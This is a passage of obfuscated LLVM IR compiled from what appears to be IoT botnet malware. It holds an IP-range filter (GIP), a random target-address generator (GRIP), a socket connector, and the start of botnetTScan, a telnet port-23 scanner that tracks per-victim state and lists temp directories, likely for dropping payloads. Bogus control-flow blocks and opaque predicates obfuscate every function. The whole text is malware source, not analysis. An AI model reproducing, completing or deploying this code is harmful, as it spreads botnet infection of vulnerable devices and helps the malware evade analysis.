  %5438 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5439 = zext i8 %5438 to i32
  %5440 = icmp eq i32 %5439, 51
  br label %originalBB466

originalBB470alteredBB:                           ; preds = %originalBB470, %3578
  %5441 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5442 = zext i8 %5441 to i32
  %5443 = icmp eq i32 %5442, 255
  br label %originalBB470

originalBB474alteredBB:                           ; preds = %originalBB474, %3606
  %5444 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5445 = zext i8 %5444 to i32
  %5446 = icmp eq i32 %5445, 5
  br label %originalBB474

originalBB478alteredBB:                           ; preds = %originalBB478, %3626
  %5447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5448 = zext i8 %5447 to i32
  %5449 = icmp eq i32 %5448, 196
  br label %originalBB478

originalBB482alteredBB:                           ; preds = %originalBB482, %3646
  %5450 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5451 = zext i8 %5450 to i32
  %5452 = icmp eq i32 %5451, 5
  br label %originalBB482

originalBB486alteredBB:                           ; preds = %originalBB486, %3674
  %5453 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5454 = zext i8 %5453 to i32
  %5455 = icmp eq i32 %5454, 134
  br label %originalBB486

originalBB490alteredBB:                           ; preds = %originalBB490, %3694
  %5456 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5457 = zext i8 %5456 to i32
  %5458 = icmp eq i32 %5457, 104
  br label %originalBB490

originalBB494alteredBB:                           ; preds = %originalBB494, %3718
  %5459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5460 = zext i8 %5459 to i32
  %5461 = icmp sge i32 %5460, 128
  br label %originalBB494

originalBB498alteredBB:                           ; preds = %originalBB498, %3758
  %5462 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5463 = zext i8 %5462 to i32
  %5464 = icmp eq i32 %5463, 107
  br label %originalBB498

originalBB502alteredBB:                           ; preds = %originalBB502, %3790
  %5465 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5466 = zext i8 %5465 to i32
  %5467 = icmp eq i32 %5466, 172
  br label %originalBB502

originalBB506alteredBB:                           ; preds = %originalBB506, %3830
  %5468 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5469 = zext i8 %5468 to i32
  %5470 = icmp sge i32 %5469, 240
  br label %originalBB506

originalBB510alteredBB:                           ; preds = %originalBB510, %3878
  %5471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5472 = zext i8 %5471 to i32
  %5473 = icmp sge i32 %5472, 208
  br label %originalBB510

originalBB514alteredBB:                           ; preds = %originalBB514, %3902
  %5474 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5475 = zext i8 %5474 to i32
  %5476 = icmp eq i32 %5475, 192
  br label %originalBB514

originalBB518alteredBB:                           ; preds = %originalBB518, %3958
  %5477 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5478 = zext i8 %5477 to i32
  %5479 = icmp sge i32 %5478, 112
  br label %originalBB518

originalBB522alteredBB:                           ; preds = %originalBB522, %3978
  %5480 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5481 = zext i8 %5480 to i32
  %5482 = icmp slt i32 %5481, 119
  br label %originalBB522

originalBB526alteredBB:                           ; preds = %originalBB526, %3998
  %5483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5484 = zext i8 %5483 to i32
  %5485 = icmp eq i32 %5484, 199
  br label %originalBB526

originalBB530alteredBB:                           ; preds = %originalBB530, %4030
  %5486 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5487 = zext i8 %5486 to i32
  %5488 = icmp eq i32 %5487, 199
  br label %originalBB530

originalBB534alteredBB:                           ; preds = %originalBB534, %4050
  %5489 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5490 = zext i8 %5489 to i32
  %5491 = icmp eq i32 %5490, 36
  br label %originalBB534

originalBB538alteredBB:                           ; preds = %originalBB538, %4082
  %5492 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5493 = zext i8 %5492 to i32
  %5494 = icmp eq i32 %5493, 58
  br label %originalBB538

originalBB542alteredBB:                           ; preds = %originalBB542, %4102
  %5495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5496 = zext i8 %5495 to i32
  %5497 = icmp sge i32 %5496, 184
  br label %originalBB542

originalBB546alteredBB:                           ; preds = %originalBB546, %4126
  %5498 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5499 = zext i8 %5498 to i32
  %5500 = icmp eq i32 %5499, 206
  br label %originalBB546

originalBB550alteredBB:                           ; preds = %originalBB550, %4146
  %5501 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5502 = zext i8 %5501 to i32
  %5503 = icmp eq i32 %5502, 220
  br label %originalBB550

originalBB554alteredBB:                           ; preds = %originalBB554, %4166
  %5504 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5505 = zext i8 %5504 to i32
  %5506 = icmp sge i32 %5505, 172
  br label %originalBB554

originalBB558alteredBB:                           ; preds = %originalBB558, %4190
  %5507 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5508 = zext i8 %5507 to i32
  %5509 = icmp eq i32 %5508, 208
  br label %originalBB558

originalBB562alteredBB:                           ; preds = %originalBB562, %4218
  %5510 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5511 = zext i8 %5510 to i32
  %5512 = icmp slt i32 %5511, 43
  br label %originalBB562

originalBB566alteredBB:                           ; preds = %originalBB566, %4238
  %5513 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5514 = zext i8 %5513 to i32
  %5515 = icmp eq i32 %5514, 208
  br label %originalBB566

originalBB570alteredBB:                           ; preds = %originalBB570, %4262
  %5516 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5517 = zext i8 %5516 to i32
  %5518 = icmp sge i32 %5517, 192
  br label %originalBB570

originalBB574alteredBB:                           ; preds = %originalBB574, %4298
  %5519 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5520 = zext i8 %5519 to i32
  %5521 = icmp slt i32 %5520, 255
  br label %originalBB574

originalBB578alteredBB:                           ; preds = %originalBB578, %4318
  %5522 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5523 = zext i8 %5522 to i32
  %5524 = icmp eq i32 %5523, 98
  br label %originalBB578

originalBB582alteredBB:                           ; preds = %originalBB582, %4346
  %5525 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5526 = zext i8 %5525 to i32
  %5527 = icmp slt i32 %5526, 223
  br label %originalBB582

originalBB586alteredBB:                           ; preds = %originalBB586, %4366
  %5528 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5529 = zext i8 %5528 to i32
  %5530 = icmp eq i32 %5529, 107
  br label %originalBB586

originalBB590alteredBB:                           ; preds = %originalBB590, %4390
  %5531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5532 = zext i8 %5531 to i32
  %5533 = icmp slt i32 %5532, 24
  br label %originalBB590

originalBB594alteredBB:                           ; preds = %originalBB594, %4418
  %5534 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5535 = zext i8 %5534 to i32
  %5536 = icmp slt i32 %5535, 183
  br label %originalBB594

originalBB598alteredBB:                           ; preds = %originalBB598, %4438
  %5537 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5538 = zext i8 %5537 to i32
  %5539 = icmp eq i32 %5538, 52
  br label %originalBB598

originalBB602alteredBB:                           ; preds = %originalBB602, %4482
  %5540 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5541 = zext i8 %5540 to i32
  %5542 = icmp sge i32 %5541, 64
  br label %originalBB602

originalBB606alteredBB:                           ; preds = %originalBB606, %4506
  %5543 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5544 = zext i8 %5543 to i32
  %5545 = icmp eq i32 %5544, 54
  br label %originalBB606

originalBB610alteredBB:                           ; preds = %originalBB610, %4526
  %5546 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5547 = zext i8 %5546 to i32
  %5548 = icmp sge i32 %5547, 144
  br label %originalBB610

originalBB614alteredBB:                           ; preds = %originalBB614, %4598
  %5549 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5550 = zext i8 %5549 to i32
  %5551 = icmp eq i32 %5550, 121
  br label %originalBB614

originalBB618alteredBB:                           ; preds = %originalBB618, %4630
  %5552 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5553 = zext i8 %5552 to i32
  %5554 = icmp eq i32 %5553, 47
  br label %originalBB618

originalBB622alteredBB:                           ; preds = %originalBB622, %4650
  %5555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5556 = zext i8 %5555 to i32
  %5557 = icmp sge i32 %5556, 224
  br label %originalBB622

originalBB626alteredBB:                           ; preds = %originalBB626, %4678
  %5558 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5559 = zext i8 %5558 to i32
  %5560 = icmp eq i32 %5559, 34
  br label %originalBB626

originalBB630alteredBB:                           ; preds = %originalBB630, %4710
  %5561 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5562 = zext i8 %5561 to i32
  %5563 = icmp sge i32 %5562, 216
  br label %originalBB630

originalBB634alteredBB:                           ; preds = %originalBB634, %4734
  %5564 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5565 = zext i8 %5564 to i32
  %5566 = icmp eq i32 %5565, 23
  br label %originalBB634

originalBB638alteredBB:                           ; preds = %originalBB638, %4762
  %5567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5568 = zext i8 %5567 to i32
  %5569 = icmp eq i32 %5568, 178
  br label %originalBB638

originalBB642alteredBB:                           ; preds = %originalBB642, %4786
  %5570 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5571 = zext i8 %5570 to i32
  %5572 = icmp slt i32 %5571, 63
  br label %originalBB642

originalBB646alteredBB:                           ; preds = %originalBB646, %4810
  %5573 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5574 = zext i8 %5573 to i32
  %5575 = icmp sge i32 %5574, 182
  br label %originalBB646

originalBB650alteredBB:                           ; preds = %originalBB650, %4830
  %5576 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5577 = zext i8 %5576 to i32
  %5578 = icmp slt i32 %5577, 189
  br label %originalBB650

originalBB654alteredBB:                           ; preds = %originalBB654, %4886
  %5579 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5580 = zext i8 %5579 to i32
  %5581 = icmp slt i32 %5580, 99
  br label %originalBB654

originalBB658alteredBB:                           ; preds = %originalBB658, %4906
  %5582 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5583 = zext i8 %5582 to i32
  %5584 = icmp eq i32 %5583, 86
  br label %originalBB658

originalBB662alteredBB:                           ; preds = %originalBB662, %4926
  %5585 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5586 = zext i8 %5585 to i32
  %5587 = icmp eq i32 %5586, 208
  br label %originalBB662

originalBB666alteredBB:                           ; preds = %originalBB666, %4946
  %5588 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5589 = zext i8 %5588 to i32
  %5590 = icmp eq i32 %5589, 86
  br label %originalBB666

originalBB670alteredBB:                           ; preds = %originalBB670, %4990
  %5591 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5592 = zext i8 %5591 to i32
  %5593 = icmp eq i32 %5592, 188
  br label %originalBB670

originalBB674alteredBB:                           ; preds = %originalBB674, %5018
  %5594 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5595 = zext i8 %5594 to i32
  %5596 = icmp eq i32 %5595, 46
  br label %originalBB674

originalBB678alteredBB:                           ; preds = %originalBB678, %5042
  br label %originalBB678
}

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define i32 @GRIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %61

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #3
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #3
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #3
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %53

; <label>:36:                                     ; preds = %14
  %37 = load i32, i32* @x.75
  %38 = load i32, i32* @y.76
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  store i32 0, i32* %3, align 4
  %45 = load i32, i32* @x.75
  %46 = load i32, i32* @y.76
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %61

; <label>:53:                                     ; preds = %14
  %54 = load i32, i32* %9, align 4
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = call i32 @connect(i32 %54, %struct.sockaddr* %55, i32 16)
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %53
  store i32 0, i32* %3, align 4
  br label %61

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %9, align 4
  store i32 %60, i32* %3, align 4
  br label %61

; <label>:61:                                     ; preds = %59, %58, %originalBBpart2, %13
  %62 = load i32, i32* %3, align 4
  ret i32 %62

originalBBalteredBB:                              ; preds = %originalBB, %36
  store i32 0, i32* %3, align 4
  br label %originalBB
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @botnetTScan(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %11, align 4
  %24 = call i64 @time(i64* null) #3
  %25 = call i32 @rand_cmwc()
  %26 = zext i32 %25 to i64
  %27 = xor i64 %24, %26
  %28 = trunc i64 %27 to i32
  call void @srand(i32 %28) #3
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 23) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %33 = getelementptr inbounds [8 x i8], [8 x i8]* %32, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 8, i32 4, i1 false)
  %34 = call noalias i8* @malloc(i64 1025) #3
  store i8* %34, i8** %17, align 8
  %35 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 1025, i32 1, i1 false)
  %36 = load i32, i32* %11, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %19, align 8
  %39 = alloca %struct.telstate_t, i64 %37, align 16
  %40 = bitcast %struct.telstate_t* %39 to i8*
  %41 = load i32, i32* %11, align 4
  %42 = sext i32 %41 to i64
  %43 = mul i64 %42, 5
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 %43, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  br label %44

; <label>:44:                                     ; preds = %originalBBpart211, %2
  %45 = load i32, i32* @x.77
  %46 = load i32, i32* @y.78
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = load i32, i32* %5, align 4
  %54 = load i32, i32* %11, align 4
  %55 = icmp slt i32 %53, %54
  %56 = load i32, i32* @x.77
  %57 = load i32, i32* @y.78
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %55, label %64, label %113

; <label>:64:                                     ; preds = %originalBBpart2
  %65 = load i32, i32* @x.77
  %66 = load i32, i32* @y.78
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %64
  %73 = load i32, i32* %5, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %74
  %76 = bitcast %struct.telstate_t* %75 to i8*
  call void @llvm.memset.p0i8.i64(i8* %76, i8 0, i64 32, i32 16, i1 false)
  %77 = load i32, i32* %5, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %78
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %79, i32 0, i32 3
  store i8 1, i8* %80, align 1
  %81 = load i8*, i8** %17, align 8
  %82 = load i32, i32* %5, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %83
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %84, i32 0, i32 9
  store i8* %81, i8** %85, align 8
  %86 = load i32, i32* @x.77
  %87 = load i32, i32* @y.78
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %94

; <label>:94:                                     ; preds = %originalBBpart24
  %95 = load i32, i32* @x.77
  %96 = load i32, i32* @y.78
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %94
  %103 = load i32, i32* %5, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %5, align 4
  %105 = load i32, i32* @x.77
  %106 = load i32, i32* @y.78
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart211, label %originalBB6alteredBB

originalBBpart211:                                ; preds = %originalBB6
  br label %44

; <label>:113:                                    ; preds = %originalBBpart2
  %114 = load i32, i32* @x.77
  %115 = load i32, i32* @y.78
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %113
  store i32 0, i32* %7, align 4
  %122 = load i32, i32* @x.77
  %123 = load i32, i32* @y.78
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br label %130

; <label>:130:                                    ; preds = %originalBBpart219, %originalBBpart215
  %131 = load i32, i32* %7, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %7, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %133
  %135 = load i8*, i8** %134, align 8
  %136 = icmp ne i8* %135, null
  br i1 %136, label %137, label %154

; <label>:137:                                    ; preds = %130
  %138 = load i32, i32* @x.77
  %139 = load i32, i32* @y.78
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %137
  %146 = load i32, i32* @x.77
  %147 = load i32, i32* @y.78
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %130

; <label>:154:                                    ; preds = %130
  %155 = load i32, i32* @x.77
  %156 = load i32, i32* @y.78
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %154
  %163 = load i32, i32* @x.77
  %164 = load i32, i32* @y.78
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %171

; <label>:171:                                    ; preds = %originalBBpart2226, %originalBBpart223
  br label %172

; <label>:172:                                    ; preds = %171
  %173 = load i32, i32* @x.77
  %174 = load i32, i32* @y.78
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %172
  store i32 0, i32* %5, align 4
  %181 = load i32, i32* @x.77
  %182 = load i32, i32* @y.78
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %189

; <label>:189:                                    ; preds = %originalBBpart2222, %originalBBpart227
  %190 = load i32, i32* %5, align 4
  %191 = load i32, i32* %11, align 4
  %192 = icmp slt i32 %190, %191
  br i1 %192, label %193, label %1310

; <label>:193:                                    ; preds = %189
  %194 = load i32, i32* %5, align 4
  %195 = sext i32 %194 to i64
